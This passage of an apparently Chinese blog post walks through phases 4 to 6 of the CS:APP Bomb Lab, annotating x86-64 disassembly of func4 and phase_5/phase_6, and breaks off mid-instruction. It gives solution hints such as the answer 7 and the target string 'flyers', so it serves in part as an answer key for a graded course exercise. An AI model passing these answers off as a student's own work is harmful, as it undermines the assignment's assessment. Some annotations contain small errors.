class="hljs-comment">// eax不为0，跳到炸弹那里去</span><br>  <span class="hljs-number">401051</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span>       cmpl   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0xc</span>(%rsp) <span class="hljs-comment">// 比较0和rsp+12指向的值</span><br>  <span class="hljs-number">401056</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">40105</span>d &lt;phase_4+<span class="hljs-number">0x51</span>&gt; <span class="hljs-comment">// 如果rsp+12指向的值就是0，则通过</span><br>  <span class="hljs-number">401058</span>:e8 dd <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">40105</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401061</span>:c3                   retq<br></code></pre></td></tr></table></figure><p>func4函数的反汇编的代码</p><ol><li>func4是一个递归程序，这个代码如果要完全弄清楚，非常复杂，有一些大佬将其一步步分析成C语言代码，但是依然很恶心。不过如果只是想要通过，就没那么难。</li><li>首先，func4有3个参数，第一个参数就是我们输入的第一个数字，第二个参数固定为0，第三个参数固定为14</li><li>在func4的第一次跳转之前，ecx一定是7。然后我们用第一个数字和ecx即7比较，如果小于等于7就会跳转。</li><li>跳转之后，又用我们第一个数字和ecx即7进行比较，如果小于等于7，就会直接结束函数，并且返回0</li><li>因此，可以发现，7就是一个答案。并且是最简单的那个，都不会触发递归。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>ce &lt;func4&gt;:<br>  <span class="hljs-number">400f</span>ce:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">400f</span>d2:<span class="hljs-number">89</span> d0                mov    %edx,%eax <span class="hljs-comment">// eax被置为14</span><br>  <span class="hljs-number">400f</span>d4:<span class="hljs-number">29</span> f0                sub    %esi,%eax <span class="hljs-comment">// eax被置为14</span><br>  <span class="hljs-number">400f</span>d6:<span class="hljs-number">89</span> c1                mov    %eax,%ecx <span class="hljs-comment">// ecx被置为14</span><br>  <span class="hljs-number">400f</span>d8:c1 e9 <span class="hljs-number">1f</span>             shr    $<span class="hljs-number">0x1f</span>,%ecx <span class="hljs-comment">// ecx被置为0</span><br>  <span class="hljs-number">400f</span>db:<span class="hljs-number">01</span> c8                add    %ecx,%eax <span class="hljs-comment">// eax被置为14 0b1110</span><br>  <span class="hljs-number">400f</span>dd:d1 f8                sar    %eax <span class="hljs-comment">// eax被置为0b111，即7</span><br>  <span class="hljs-number">400f</span>df:<span class="hljs-number">8</span>d <span class="hljs-number">0</span>c <span class="hljs-number">30</span>             <span class="hljs-built_in">lea</span>    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// ecx被置为7</span><br>  <br>  <span class="hljs-number">400f</span>e2:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx <span class="hljs-comment">// x和7比较</span><br>  <span class="hljs-number">400f</span>e4:<span class="hljs-number">7</span>e <span class="hljs-number">0</span>c                jle    <span class="hljs-number">400f</span>f2 &lt;func4+<span class="hljs-number">0x24</span>&gt; <span class="hljs-comment">// 如果x&lt;=7，跳转</span><br>  <span class="hljs-number">400f</span>e6:<span class="hljs-number">8</span>d <span class="hljs-number">51</span> ff             lea    <span class="hljs-number">-0x1</span>(%rcx),%edx<br>  <span class="hljs-number">400f</span>e9:e8 e0 ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt;<br>  <span class="hljs-number">400f</span>ee:<span class="hljs-number">01</span> c0                add    %eax,%eax<br>  <span class="hljs-number">400f</span>f0:eb <span class="hljs-number">15</span>                jmp    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;<br>  <br>  <span class="hljs-number">400f</span>f2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax <span class="hljs-comment">// 将eax置为0</span><br>  <span class="hljs-number">400f</span>f7:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx <span class="hljs-comment">// 将x和7比较</span><br>  <span class="hljs-number">400f</span>f9:<span class="hljs-number">7</span>d <span class="hljs-number">0</span>c                jge    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt; <span class="hljs-comment">// 如果大于等于7，则直接跳出程序</span><br>  <span class="hljs-number">400f</span>fb:<span class="hljs-number">8</span>d <span class="hljs-number">71</span> <span class="hljs-number">01</span>             lea    <span class="hljs-number">0x1</span>(%rcx),%esi <span class="hljs-comment">// 将esi置为8</span><br>  <span class="hljs-number">400f</span>fe:e8 cb ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt; <span class="hljs-comment">// 递归</span><br>  <span class="hljs-number">401003</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0x1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-number">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">40100b</span>:c3                   retq   <br></code></pre></td></tr></table></figure>我刚开始做phase4的时候，陷入了func4这个函数里，完全搞不清楚它在干啥。这也有了一个教训，看汇编代码的时候，不要陷进去汇编的细节，要能够提取它的作用，用C语言的形式去想一下，或者想一想它具体在完成什么动作。</li></ol><h1 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h1><p>这个炸弹很有意思</p><ol><li>首先阅读汇编代码，搞清楚每个语句的作用，然后按照代码的逻辑给它划分，看的更加有层次感，最后搞清楚每个层次都干了什么</li><li>首先，这个phase需要我们输入一个长度为6的字符串</li><li>然后根据我们这些字符串的ascii码的二进制表示的最低4位的值为偏移，去系统给出的一个字符串取字符</li><li>根据输入的6个字符取出来的6个字符需要刚好和系统给定的另一个字符串相同<br>做的时候踩了些坑</li><li>第一遍阅读汇编代码的时候，就可以尝试去划分和理解，不用等到完全读了一遍之后再来划分。这样效率其实很低。耐下心来正确地分析代码，还是可以在第一遍读代码的时候就理解代码的逻辑的。这样就算没有很清楚，也可以通过第二轮去专门划分</li><li>有的时候各种寄存器一波操作，其实就是完成了一个很简单的逻辑，不要迷失在细节里了</li><li>分清楚传的是寄存器的值还是这个寄存器指向的内存的值<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000401062</span> &lt;phase_5&gt;:<br><span class="hljs-comment">// 将fs:0x28的值放到rsp+24字节的位置</span><br>  <span class="hljs-number">401062</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">401063</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">20</span>          sub    $<span class="hljs-number">0x20</span>,%rsp <span class="hljs-comment">// 给栈挪出32字节的位置</span><br>  <span class="hljs-number">401067</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx <span class="hljs-comment">// 将我们的输入给rbx</span><br>  <span class="hljs-number">40106</span>a:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> mov    %fs:<span class="hljs-number">0x28</span>,%rax <span class="hljs-comment">// 将段寄存器偏移40字节的值给rax</span><br>  <span class="hljs-number">401071</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">401073</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    %rax,<span class="hljs-number">0x18</span>(%rsp) <span class="hljs-comment">// 将rax给栈顶指针+24字节的位置</span><br><br><span class="hljs-comment">// 判断输入字符串的长度是否是6，如果不是6则直接爆炸</span><br>  <span class="hljs-number">401078</span>:<span class="hljs-number">31</span> c0                <span class="hljs-keyword">xor</span>    %eax,%eax <span class="hljs-comment">// eax清零</span><br>  <span class="hljs-number">40107</span>a:e8 <span class="hljs-number">9</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40131b</span> &lt;string_length&gt; <span class="hljs-comment">// 获取我们输入的字符串的长度</span><br>  <span class="hljs-number">40107f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>             cmp    $<span class="hljs-number">0x6</span>,%eax <span class="hljs-comment">// 判断是否是6</span><br>  <span class="hljs-number">401082</span>:<span class="hljs-number">74</span> <span class="hljs-number">4</span>e                je     <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt; <span class="hljs-comment">// 如果是6的话，则跳过炸弹</span><br>  <span class="hljs-number">401084</span>:e8 b1 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果不是6，则直接爆炸</span><br>  <span class="hljs-number">401089</span>:eb <span class="hljs-number">47</span>                jmp    <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt;<br><br><span class="hljs-comment">// 这一段就是把我们输入的字符串通过一些奇怪的处理，放置在栈上rsp+16开始的位置，16-21</span><br><span class="hljs-comment">// 这个奇怪的处理应该是根据我们输入的字符，用它们的ascii码为偏移，去0x4024b0地址取字符放到rsp+16开始的位置</span><br>  <span class="hljs-number">40108b</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">0</span>c <span class="hljs-number">03</span>          <span class="hljs-built_in">movzbl</span> (%rbx,%rax,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// 将rbx+rax指向的值放入ecx，这里的rbx就是我们的输入，这里应该就是依次把字符给ecx</span><br>  <span class="hljs-number">40108f</span>:<span class="hljs-number">88</span> <span class="hljs-number">0</span>c <span class="hljs-number">24</span>             mov    %cl,(%rsp) <span class="hljs-comment">// 将ecx的值为栈顶指向的位置</span><br>  <span class="hljs-number">401092</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">14</span> <span class="hljs-number">24</span>          <span class="hljs-built_in">mov</span>    (%rsp),%rdx <span class="hljs-comment">// 把栈顶的值给edx</span><br>  <span class="hljs-number">401096</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">0f</span>             <span class="hljs-keyword">and</span>    $<span class="hljs-number">0xf</span>,%edx <span class="hljs-comment">// 用0b1111与edx按位与</span><br>  <span class="hljs-number">401099</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">92</span> b0 <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> movzbl <span class="hljs-number">0x4024b0</span>(%rdx),%edx <span class="hljs-comment">// 将0x4024b0+edx指向的值给edx</span><br>  <span class="hljs-number">4010</span>a0:<span class="hljs-number">88</span> <span class="hljs-number">54</span> <span class="hljs-number">04</span> <span class="hljs-number">10</span>          mov    %dl,<span class="hljs-number">0x10</span>(%rsp,%rax,<span class="hljs-number">1</span>) <span class="hljs-comment">// 将edx的值放到16+rsp+rax指向的位置</span><br>  <span class="hljs-number">4010</span>a4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rax <span class="hljs-comment">// 给rax+1</span><br>  <span class="hljs-number">4010</span>a8:<span class="hljs-number">48</span> <span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%rax <span class="hljs-comment">// 6和rax比较</span><br>  <span class="hljs-number">4010</span>ac:<span class="hljs-number">75</span> dd                jne    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 如果不同，则继续循环</span><br><br><span class="hljs-comment">// 判断我们放在栈上的字符串是否和0x40245e这个地址的字符一样</span><br>  <span class="hljs-number">4010</span>ae:c6 <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>       movb   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x16</span>(%rsp) <span class="hljs-comment">// 将rsp+22指向的值置为0</span><br>  <span class="hljs-number">4010b</span>3:be <span class="hljs-number">5</span>e <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x40245e</span>,%esi <span class="hljs-comment">// 给esi一个地址0x40245e // &quot;flyers&quot;</span><br>  <span class="hljs-number">4010b</span>8:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">10</span>       lea    <span class="hljs-number">0x10</span>(%rsp),%rdi <span class="hljs-comment">// 给rdi一个地址rsp+16 // &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br>  <span class="hljs-number">4010b</span>d:e8 <span class="hljs-number">76</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt; <span class="hljs-comment">// 比较这两个地址指向的字符串</span><br>  <span class="hljs-number">4010</span>c2:<span class="hljs-number">85</span> c0                test   %eax,%eax <br>  <span class="hljs-number">4010</span>c4:<span class="hljs-number">74</span> <span class="hljs-number">13</span>                je     <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt; <span class="hljs-comment">// 如果字符串相同，则跳过炸弹</span><br>  <span class="hljs-number">4010</span>c6:e8 <span class="hljs-number">6f</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果字符串不相同，则爆炸</span><br>  <span class="hljs-number">4010</span>cb:<span class="hljs-number">0f</span> <span class="hljs-number">1f</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nopl   <span class="hljs-number">0x0</span>(%rax,%rax,<span class="hljs-number">1</span>)<br>  <span class="hljs-number">4010</span>d0:eb <span class="hljs-number">07</span>                jmp    <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt;<br><br>  <span class="hljs-number">4010</span>d2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax <span class="hljs-comment">// 将eax置0</span><br>  <span class="hljs-number">4010</span>d7:eb b2                jmp    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 跳转</span><br><br><span class="hljs-comment">// 比较%fs:0x2和栈上0x18(%rsp)开始的值是否一样，一样则成功。这个测试正常来说不会有问题。</span><br>  <span class="hljs-number">4010</span>d9:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    <span class="hljs-number">0x18</span>(%rsp),%rax <span class="hljs-comment">// 将rsp+24指向的值给rax</span><br>  <span class="hljs-number">4010</span>de:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">xor</span>    %fs:<span class="hljs-number">0x28</span>,%rax <span class="hljs-comment">// 将rax和一个地址的值异或</span><br>  <span class="hljs-number">4010e5</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">4010e7</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4010</span>ee &lt;phase_5+<span class="hljs-number">0x8c</span>&gt; <span class="hljs-comment">// 如果等于0，则跳过下面这个函数，成功返回</span><br>  <span class="hljs-number">4010e9</span>:e8 <span class="hljs-number">42</span> fa ff ff       callq  <span class="hljs-number">400b</span>30 &lt;__stack_chk_fail@plt&gt;<br>  <span class="hljs-number">4010</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">20</span>          add    $<span class="hljs-number">0x20</span>,%rsp<br>  <span class="hljs-number">4010f</span>2:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4010f</span>3:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol><h1 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h1><p>这个lab也很有意思啊</p><ol><li>首先，它需要我们输入六个数字</li><li>其次，它要求我们这个六个数字都小于等于6，并且不重复</li><li>然后，它会把我们这六个数字替换为7-x，即如果输入是123456，就会被替换成654321</li><li>然后，它会根据现在的数字，去一个链表里取6个数字。比如我们现在的数字被变成了6454321，那么它就会去这个链表里取出从第六个到第一个结点的地址。再将这个地址放到栈中从rsp+0x20开始的地方</li><li>然后，它会依次把取出来的六个结点串成一个链表</li><li>最后，它会检查这个链表是否是一个单调递减链表<br>因此，我们输入的六个数字其实就相当于是一个排序的方法，如果我们输入214356，那就代表着我们把原链表里的顺序从123456改为214356，然后判断修改之后是否是单调递减的。注意，这里说的123456指的是链表的结点编号，排序的依据是这个节点的val。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004010f</span>4 &lt;phase_6&gt;:<br><span class="hljs-comment">// 准备操作</span><br>  <span class="hljs-number">4010f</span>4:<span class="hljs-number">41</span> <span class="hljs-number">56</span>                push   %r14<br>  <span class="hljs-number">4010f</span>6:<span class="hljs-number">41</span> <span class="hljs-number">55</span>                push   %r13<br>  <span class="hljs-number">4010f</span>8:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r12<br>  <span class="hljs-number">4010f</span>a:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">4010f</span>b:<span class="hljs-number">53</span>                   push   %rbx<br><span class="hljs-comment">// 开始操作</span><br>  <span class="hljs-number">4010f</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">50</span>          sub    $<span class="hljs-number">0x50</span>,%rsp <span class="hljs-comment">// 开辟了80个字节的栈空间</span><br>  <span class="hljs-number">401100</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e5             mov    %rsp,%r13 <span class="hljs-comment">// 将栈顶指针给r13</span><br>  <span class="hljs-number">401103</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi <span class="hljs-comment">// 将栈顶指针给了rsi，即函数的第二个参数</span><br>  <span class="hljs-number">401106</span>:e8 <span class="hljs-number">51</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt; <span class="hljs-comment">// 将我们输入的6个数字读入栈中</span><br>  <span class="hljs-number">40110b</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e6             mov    %rsp,%r14 <span class="hljs-comment">// 把栈指针给了r14</span><br>  <span class="hljs-number">40110</span>e:<span class="hljs-number">41</span> bc <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    mov    $<span class="hljs-number">0x0</span>,%r12d <span class="hljs-comment">// 将r12置为0</span><br><br><span class="hljs-comment">// 下面这一波就是判断，是否六个数字都不同，并且六个数字都小于等于6</span><br>  <span class="hljs-number">401114</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> ed             mov    %r13,%rbp <span class="hljs-comment">// 把r13给rbp，rbp是栈底指针啊</span><br>  <span class="hljs-number">401117</span>:<span class="hljs-number">41</span> <span class="hljs-number">8b</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>          mov    <span class="hljs-number">0x0</span>(%r13),%eax <span class="hljs-comment">// 把r13指向的东西赋给了eax，r13现在是栈底，应该就是我们输入的第一个数字</span><br>  <span class="hljs-number">40111b</span>:<span class="hljs-number">83</span> e8 <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// 将输入的第一个数字减1</span><br>  <span class="hljs-number">40111</span>e:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax <span class="hljs-comment">// 5和输入的数字进行比较</span><br>  <span class="hljs-number">401121</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">401128</span> &lt;phase_6+<span class="hljs-number">0x34</span>&gt; <span class="hljs-comment">// 输入的数字减1后小于等于5，则跳过炸弹，否则爆炸</span><br>  <span class="hljs-number">401123</span>:e8 <span class="hljs-number">12</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401128</span>:<span class="hljs-number">41</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%r12d <span class="hljs-comment">// 给r12加1,r12在这之前刚被置为0</span><br>  <span class="hljs-number">40112</span>c:<span class="hljs-number">41</span> <span class="hljs-number">83</span> fc <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%r12d <span class="hljs-comment">// 6和r12对比，如果一样则跳转，第一次到这里应该是不会跳转</span><br>  <span class="hljs-number">401130</span>:<span class="hljs-number">74</span> <span class="hljs-number">21</span>                je     <span class="hljs-number">401153</span> &lt;phase_6+<span class="hljs-number">0x5f</span>&gt;<br>  <span class="hljs-number">401132</span>:<span class="hljs-number">44</span> <span class="hljs-number">89</span> e3             mov    %r12d,%ebx <span class="hljs-comment">// 将r12给ebx，即ebx置为1</span><br><span class="hljs-comment">// 下面这一段是判断输入的第2到第6数是否都不和第1个数相同，如果存在相同的，则直接爆炸</span><br>  <span class="hljs-number">401135</span>:<span class="hljs-number">48</span> <span class="hljs-number">63</span> c3             movslq %ebx,%rax <span class="hljs-comment">// 将ebx给rax，rax=1</span><br>  <span class="hljs-number">401138</span>:<span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">84</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rax,<span class="hljs-number">4</span>),%eax <span class="hljs-comment">// eax=rsp+4*rax指向的值，第一次运行到这里应该是rsp+4，访问的是输入的第2个数字</span><br>  <span class="hljs-number">40113b</span>:<span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    %eax,<span class="hljs-number">0x0</span>(%rbp) <span class="hljs-comment">// eax和rbp指向的值比较,即第一个数和第二个数进行比较</span><br>  <span class="hljs-number">40113</span>e:<span class="hljs-number">75</span> <span class="hljs-number">05</span>                jne    <span class="hljs-number">401145</span> &lt;phase_6+<span class="hljs-number">0x51</span>&gt; <span class="hljs-comment">// 如果不同，则跳转，否则就爆炸</span><br>  <span class="hljs-number">401140</span>:e8 f5 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401145</span>:<span class="hljs-number">83</span> c3 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%ebx <span class="hljs-comment">// ebx+=1</span><br>  <span class="hljs-number">401148</span>:<span class="hljs-number">83</span> fb <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%ebx <span class="hljs-comment">// ebx和5进行对比，如果ebx小于等于5，则跳转</span><br>  <span class="hljs-number">40114b</span>:<span class="hljs-number">7</span>e e8                jle    <span class="hljs-number">401135</span> &lt;phase_6+<span class="hljs-number">0x41</span>&gt;<br><span class="hljs-comment">// 给r13加4</span><br>  <span class="hljs-number">40114</span>d:<span class="hljs-number">49</span> <span class="hljs-number">83</span> c5 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%r13<br>  <span class="hljs-number">401151</span>:eb c1                jmp    <span class="hljs-number">401114</span> &lt;phase_6+<span class="hljs-number">0x20</span>&gt;<br><br>  <span class="hljs-number">401153</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rsi <span class="hljs-comment">// 将rsi指向rsp+24的位置</span><br>  <span class="hljs-number">401158</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> f0             mov    %r14,%rax <span class="hljs-comment">// 把r14给rax，第一次运行到这里的时候r14这时候就是rsp</span><br>  <span class="hljs-number">40115b</span>:b9 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x7</span>,%ecx <span class="hljs-comment">// ecx置为7</span><br><span class="hljs-comment">// 这是一个小循环，循环6次，将我们输入的数，都换成7-x</span><br>  <span class="hljs-number">401160</span>:<span class="hljs-number">89</span> ca                mov    %ecx,%edx <span class="hljs-comment">// edx置为7</span><br>  <span class="hljs-number">401162</span>:<span class="hljs-number">2b</span> 